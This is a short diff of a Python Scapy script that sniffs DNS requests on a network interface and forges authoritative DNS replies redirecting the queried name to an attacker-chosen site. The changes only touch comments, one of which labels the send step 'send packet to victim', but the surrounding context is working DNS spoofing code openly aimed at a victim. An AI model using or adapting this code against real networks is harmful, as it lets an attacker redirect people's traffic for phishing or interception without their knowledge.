@@ -24,7 +24,7 @@ def sniff_DNSpackets():
         DNSpkt = sniff(count=1, filter="dst port 53", iface=argv[1])
         # if it is a DNS request, start with creating response
         if DNSpkt.haslayer(DNSQR):
-            # alter_packet(DNSpkt)
+            # ignore this: alter_packet(DNSpkt)
             dstIP = DNSpkt.getlayer(IP).dst
             srcIP = DNSpkt.getlayer(IP).src
 
@@ -51,6 +51,7 @@ def sniff_DNSpackets():
                              UDP(dport=srcPort, sport=dstPort)/\
                              DNS(id=dnsId, qd=dnsQd, aa=1, qr=1, an=DNSRR(rrname=queryName), ttl=20, rdata=my_site)
 
+            # send packet to victim
             send(spoof_response)
 
 
